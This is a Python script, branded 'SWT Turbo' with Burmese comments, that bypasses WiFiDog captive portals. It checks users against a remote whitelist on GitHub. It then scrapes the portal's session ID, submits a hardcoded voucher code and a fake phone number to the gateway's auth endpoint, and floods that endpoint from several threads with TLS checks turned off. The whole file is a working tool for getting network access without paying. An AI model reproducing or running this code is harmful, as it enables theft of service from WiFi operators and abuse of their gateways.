import requests
import re
import urllib3
import time
import threading
import os
import sys
import psutil
from urllib.parse import urlparse, parse_qs, urljoin

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# --- CONFIGURATION ---
WHITELIST_URL = "https://raw.githubusercontent.com/winhtetaung1662004-byte/win/main/keys.txt"
PING_THREADS = 5
PING_INTERVAL = 0.1

def clear_screen():
    os.system('clear' if os.name == 'posix' else 'cls')

def get_data_usage():
    """လက်ရှိ အသုံးပြုနေတဲ့ Total Data Usage (MB) ကို တွက်ချက်ရန်"""
    net_io = psutil.net_io_counters()
    total_bytes = net_io.bytes_sent + net_io.bytes_recv
    return total_bytes / (1024 * 1024)  # MB ပြောင်းခြင်း

def show_banner():
    clear_screen()
    banner = """
    \033[1;32m
    ##########################################
    #                                        #
    #              SWT  TURBO                #
    #        FAST & UNLIMITED ACCESS         #
    #                                        #
    ##########################################
    \033[0m
    """
    print(banner)

def check_approval():
    """Device ID ကို keys.txt နဲ့ တိုက်စစ်ခြင်း"""
    try:
        # Termux ID သို့မဟုတ် Username ကို ယူခြင်း
        device_id = os.popen("whoami").read().strip()
        print(f"[*] Checking Approval for: {device_id}...")
        
        response = requests.get(WHITELIST_URL, timeout=10)
        allowed_users = response.text.splitlines()
        
        if device_id in allowed_users:
            print("[+] Access Granted!")
            time.sleep(1)
            return True
        else:
            print(f"\n\033[1;31m[!] Access Denied! ID: {device_id} is not registered.\033[0m")
            print("[*] Contact Admin to get approval.")
            sys.exit()
    except Exception as e:
        print(f"[!] Security Error: {e}")
        sys.exit()

def check_real_internet():
    try:
        return requests.get("http://www.google.com", timeout=3).status_code == 200
    except: return False

def status_display(start_time, start_data):
    """Usage Time နဲ့ Data Usage ကို Live ပြပေးရန်"""
    while True:
        # အချိန်တွက်ချက်မှု
        elapsed = time.time() - start_time
        mins, secs = divmod(int(elapsed), 60)
        hours, mins = divmod(mins, 60)
        
        # Data Usage တွက်ချက်မှု
        current_data = get_data_usage()
        session_data = current_data - start_data
        
        print(f"\r\033[1;36m[*] Time: {hours:02d}:{mins:02d}:{secs:02d} | Data Used: {session_data:.2f} MB | Status: Online\033[0m", end='')
        time.sleep(1)

def high_speed_ping(auth_link, session):
    while True:
        try:
            session.get(auth_link, timeout=5)
        except: break
        time.sleep(PING_INTERVAL)

def start_process():
    show_banner()
    check_approval()
    
    print("\n\033[1;33m[1] Start SWT Turbo Internet")
    print("[0] Exit\033[0m")
    
    choice = input("\nSelect Option: ")
    if choice != '1':
        print("Exiting...")
        sys.exit()

    clear_screen()
    show_banner()
    print("[*] Initializing system... Connecting to Gateway...")

    start_time = None
    start_data = get_data_usage()
    timer_started = False

    while True:
        session = requests.Session()
        test_url = "http://connectivitycheck.gstatic.com/generate_204"
        
        try:
            r = requests.get(test_url, allow_redirects=True, timeout=5)
            
            if r.url == test_url and check_real_internet():
                if not timer_started:
                    start_time = time.time()
                    threading.Thread(target=status_display, args=(start_time, start_data), daemon=True).start()
                    timer_started = True
                time.sleep(5)
                continue
            
            # Captive Portal Logic
            portal_url = r.url
            parsed_portal = urlparse(portal_url)
            portal_host = f"{parsed_portal.scheme}://{parsed_portal.netloc}"
            
            r1 = session.get(portal_url, verify=False, timeout=10)
            path_match = re.search(r"location\.href\s*=\s*['\"]([^'\"]+)['\"]", r1.text)
            next_url = urljoin(portal_url, path_match.group(1)) if path_match else portal_url
            r2 = session.get(next_url, verify=False, timeout=10)
            
            sid = parse_qs(urlparse(r2.url).query).get('sessionId', [None])[0]
            
            if sid:
                # Voucher Activation
                voucher_api = f"{portal_host}/api/auth/voucher/"
                session.post(voucher_api, json={'accessCode': '123456', 'sessionId': sid, 'apiVersion': 1}, timeout=5)

                # Gateway Info
                params = parse_qs(parsed_portal.query)
                gw_addr = params.get('gw_address', ['192.168.60.1'])[0]
                gw_port = params.get('gw_port', ['2060'])[0]
                auth_link = f"http://{gw_addr}:{gw_port}/wifidog/auth?token={sid}&phonenumber=12345"

                # Turbo Threads
                for _ in range(PING_THREADS):
                    threading.Thread(target=high_speed_ping, args=(auth_link, session), daemon=True).start()

                while check_real_internet(): time.sleep(5)

        except:
            time.sleep(2)

if __name__ == "__main__":
    # psutil မရှိရင် သွင်းခိုင်းမယ်
    try:
        import psutil
    except ImportError:
        os.system('pip install psutil requests')
        import psutil
    
    start_process()

